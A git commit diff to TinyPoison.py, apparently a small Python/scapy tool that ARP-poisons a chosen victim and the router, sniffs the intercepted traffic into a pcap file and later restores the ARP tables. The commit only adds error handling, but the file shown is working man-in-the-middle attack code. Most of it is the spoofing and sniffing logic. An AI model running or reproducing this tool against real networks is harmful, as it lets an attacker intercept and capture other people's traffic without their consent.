45c77112884d737aa4c3c50fc42a324afc40d994
1024m <1024m@protonmail.com>
2018-09-17 09:09:46 -0600

    Added error catching in more places

--- TinyPoison.py
+++ TinyPoison.py
@@ -15,34 +15,56 @@
 		victim_ip: If this is not set to ask, it is the IP attacked by TinyPoison
 '''
 
-import os, json, sys, netifaces
-from scapy.all import *
+try:
+	import os, json, sys, netifaces
+	from scapy.all import *
+except:
+	print("Couldn't load libraries!")
+	print("Please make sure you have the following libs installed:")
+	print("os json sys netifaces scapy")
+	sys.exit(1)
 
 # Function to get MAC address from IP (duh)
 def get_mac_addr(IP):
-	ans, unans = arping(IP)
-	for s, r in ans:
-		return r[Ether].src
+	try:
+		ans, unans = arping(IP)
+		for s, r in ans:
+			return r[Ether].src
+	except:
+		print("Error getting mac addr. for IP \"" + IP + "\"")
+		sys.exit(1)
 
 def spoof(router_ip_address, victim_ip_address):
 	# Get MAC addresses
 	victimMAC = get_mac_addr(victim_ip_address)
 	routerMAC = get_mac_addr(router_ip_address)
 	# Spoof the ARP things
-	send(ARP(op =2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = victimMAC))
-	send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = routerMAC))
+	try:
+		send(ARP(op =2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = victimMAC))
+		send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = routerMAC))
+	except:
+		print("Error sending spoofed ARP packets.")
+		sys.exit(1)
 
 def undo_arp_poison(router_ip_address, victim_ip_address):
 	# Reversed spoof() function
 	victimMAC = get_mac_addr(victim_ip_address)
 	routerMAC = get_mac_addr(router_ip_address)
-	send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
-	send(ARP(op = 2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
+	try:
+		send(ARP(op = 2, pdst = router_ip_address, psrc = victim_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
+		send(ARP(op = 2, pdst = victim_ip_address, psrc = router_ip_address, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
+	except:
+		print("Error undoing ARP spoof.")
+		sys.exit(1)
 
 # Packet sniffer
 def sniffer():
-	pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
-	wrpcap(output_file_name, pkts)
+	try:
+		pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
+		wrpcap(output_file_name, pkts)
+	except:
+		print("Error sniffing packets.")
+		sys.exit(1)
 
 # Actually do the ARP poisoning
 def spoof_arp():
@@ -56,21 +78,31 @@ def spoof_arp():
 			undo_arp_poison(router_ip_address, victim_ip_address) # Cure ARP poisoning
 			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Undo setup
 			sys.exit(1) # Exit
+		except:
+			print("Unknown error.")
+			sys.exit(1)
 
 if __name__ == "__main__":
 	print("TinyPoison 1.1")
 	
 	# Load config file
-	with open("config.json") as configfile:
-		config = json.load(configfile)
+	try:
+		with open("config.json") as configfile:
+			config = json.load(configfile)
+	except:
+		print("Error loading config.json")
+		sys.exit(1)
 		
 	# Get network interface + gateway IP address
 	gws = netifaces.gateways()
 	if(config["auto_detect_interface"] == "true"):
-		interface = gws['default'][netifaces.AF_INET][1]
-		print("Interface autodetected: " + interface)
-		router_ip_address = gws['default'][netifaces.AF_INET][0]
-		print("Gateway IP found: " + router_ip_address)
+		try:
+			interface = gws['default'][netifaces.AF_INET][1]
+			print("Interface autodetected: " + interface)
+			router_ip_address = gws['default'][netifaces.AF_INET][0]
+			print("Gateway IP found: " + router_ip_address)
+		except:
+			print("Error getting interface and gateway IP.")
 	else:
 		interface = config["wireless_interface"]
 		router_ip_address = config["router_ip"]
